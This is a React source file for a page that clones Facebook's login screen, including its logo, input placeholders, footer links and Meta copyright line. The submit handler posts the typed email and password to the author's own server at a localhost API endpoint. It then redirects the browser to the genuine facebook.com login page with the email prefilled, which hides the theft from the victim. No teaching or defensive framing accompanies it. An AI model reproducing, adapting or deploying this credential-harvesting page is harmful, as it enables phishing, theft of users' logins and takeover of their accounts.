import React, { useState } from "react";
import "./App.css";
import axios from "axios";

const FacebookLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const handlersub = () => {
    const response = axios
      .post("http://localhost:8000/api/login", { email, password })
      .then((result) => {
        window.location.href = `https://www.facebook.com/login.php?email=${encodeURIComponent(
          email
        )}`;
      })
      .catch((err) => {
        console.log(err);

        alert("Your credential error occurs");
      });
  };

  return (
    <div className="facebook-container">
      <div className="facebook-content">
        <div className="facebook-left">
          <h1 className="facebook-logo">facebook</h1>
        </div>
        <div className="facebook-right">
          <div className="facebook-login-box">
            <input
              type="text"
              placeholder="Email address or phone number"
              className="facebook-input"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              className="facebook-input"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button className="facebook-login-button" onClick={handlersub}>
              Log in
            </button>
            <div className="wraper">
              <a href="#" className="facebook-forgot-password">
                Forgotten password?
              </a>
              <a href="#" className="facebook-forgot-password">
                Sign up for Facebook
              </a>
            </div>
          </div>
        </div>
      </div>
      <footer className="facebook-footer">
        <div className="width">
          <div className="facebook-languages">
            English (UK) • ગુજરાતી • हिंदी • मराठी • தமிழ் • తెలుగు • বাংলা •
            ਪੰਜਾਬੀ • اردو • മലയാളം • Español
          </div>
          <div className="facebook-footer-links">
            <a href="#">Sign Up</a> • <a href="#">Log in</a> •{" "}
            <a href="#">Messenger</a> • <a href="#">Facebook Lite</a> •{" "}
            <a href="#">Video</a> • <a href="#">Places</a> •{" "}
            <a href="#">Games</a> • <a href="#">Marketplace</a> •{" "}
            <a href="#">Meta Pay</a> • <a href="#">Meta Store</a> •{" "}
            <a href="#">Meta Quest</a> • <a href="#">Instagram</a> •{" "}
            <a href="#">Threads</a> • <a href="#">Fundraisers</a> •{" "}
            <a href="#">Services</a> • <a href="#">Voting Information Centre</a>{" "}
            • <a href="#">Privacy Policy</a> • <a href="#">Privacy Centre</a> •{" "}
            <a href="#">Groups</a> • <a href="#">About</a> •{" "}
            <a href="#">Create ad</a> • <a href="#">Create Page</a> •{" "}
            <a href="#">Developers</a> • <a href="#">Careers</a> •{" "}
            <a href="#">Cookies</a> • <a href="#">AdChoices</a> •{" "}
            <a href="#">Terms</a> • <a href="#">Help</a>
          </div>
          <p className="facebook-copyright">Meta © 2025</p>
        </div>
      </footer>
    </div>
  );
};

export default FacebookLogin;
